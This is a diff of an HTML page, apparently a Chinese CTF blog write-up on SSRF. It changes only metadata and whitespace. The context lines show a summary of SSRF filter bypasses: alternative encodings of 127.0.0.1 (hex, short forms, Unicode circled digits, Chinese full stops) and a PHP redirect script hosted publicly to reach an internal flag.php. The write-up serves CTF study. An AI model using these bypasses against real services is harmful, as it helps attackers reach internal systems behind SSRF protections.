@@ -26,11 +26,11 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416194828764.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/2289942-20220124211658010-532695203.png">
 <meta property="article:published_time" content="2025-04-15T13:03:09.000Z">
-<meta property="article:modified_time" content="2025-08-01T03:43:59.724Z">
+<meta property="article:modified_time" content="2025-10-13T13:19:27.373Z">
 <meta property="article:author" content="y@7q">
 <meta property="article:tag" content="CTF">
-<meta property="article:tag" content="刷题">
 <meta property="article:tag" content="SSRF">
+<meta property="article:tag" content="刷题">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416011910810.png">
     
@@ -419,7 +419,7 @@
 <p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416194828764.png" alt="image-20250416194828764"></p>
 <h2 id="刷题之后的bypass总结"><a href="#刷题之后的bypass总结" class="headerlink" title="刷题之后的bypass总结"></a>刷题之后的bypass总结</h2><h3 id="字符绕过"><a href="#字符绕过" class="headerlink" title="字符绕过"></a>字符绕过</h3><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">进制绕过 		<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//0x7F000001/flag.php</span></span><br><span class="line"><span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>绕过		<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//0.0.0.0/flag.php</span></span><br><span class="line">特殊的地址<span class="number">0</span>，		<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//0/flag.php </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第一个 0 在linux系统中一般会解析成127.0.0.1 ，在windows 和 macos 中一般解析成0.0.0.0</span></span><br><span class="line"></span><br><span class="line">还有			<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//127.1/flag.php //可省略0</span></span><br><span class="line">还有			<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//127.0000000000000.001/flag.php</span></span><br><span class="line">特殊字符       <span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//①②⑦.⓪.⓪.①/flag.php</span></span><br><span class="line">用中文句号绕过  <span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//127。0。0。1/</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="公网挂马"><a href="#公网挂马" class="headerlink" title="公网挂马"></a>公网挂马</h3><p>打重定向</p>
+<h3 id="公网挂马"><a href="#公网挂马" class="headerlink" title="公网挂马"></a>公网挂马</h3><p>打重定向	</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://127.0.0.1/flag.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>这段 PHP 脚本的作用是：</p>
